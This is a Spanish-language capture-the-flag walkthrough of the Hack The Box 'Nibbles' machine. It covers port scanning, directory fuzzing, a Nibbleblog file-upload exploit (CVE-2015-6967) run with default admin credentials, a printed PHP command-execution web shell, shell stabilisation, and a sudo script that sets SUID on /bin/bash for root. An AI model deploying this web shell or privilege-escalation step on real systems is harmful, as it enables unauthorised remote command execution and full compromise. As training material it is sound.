# Nibbles-HTB
Resolucion de la maquina

## NMAP

```
nmap -sS -Pn -p- -vvv 10.129.78.48 -oG ports
nmap -sSV -p22,80 10.129.78.48 -oN Scan
```

## FFUF

```
ffuf -fc 404 -t 100 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.78.48/nibbleblog/FUZZ

```

## WFUZZ

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.78.48/nibbleblog/FUZZ
```
## searchsploit

![image](https://github.com/gecr07/Nibbles-HTB/assets/63270579/067c5f78-efb1-4b02-bbe8-25396bb2ed12)


```
searchsploit nibbleblog
## Examine
searchsploit -x php/remote/38489.rb
```

> https://github.com/dix0nym/CVE-2015-6967

Examinando el exploit vemos que se puede ingresar con el password por nibbles y un usuario que habiamos identificado ya admin.


## RCE

```
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

```

En el exploit vemos a ruta y ademas que renombra el archivo al de shell.php a image.php.

## Full tty

```
script /dev/null -c bash
ctrl+z
stty raw -echo;fg
xterm
export TERM=xterm
export SHELL=/bin/bash

script /dev/null -c bash
Ctrl+z
styy raw -echo;fg
  reset
  xterm
export TERM=xterm
export SHELL=bash


```


## Privilege Escalation

![image](https://github.com/gecr07/Nibbles-HTB/assets/63270579/12047cef-97a8-4ca2-b78c-4fc7f5f7666d)

Esto quiere decir que podemos ejecutar como root y sin password monitor.sh

```
mkdir -p personal/stuff
touch monitor.sh

sudo -u root /home/nibble/personal/sutff/monitor.sh

#!/bin/bash

chmod u+s /bin/bash
bash -p # la bandera privilege

```


































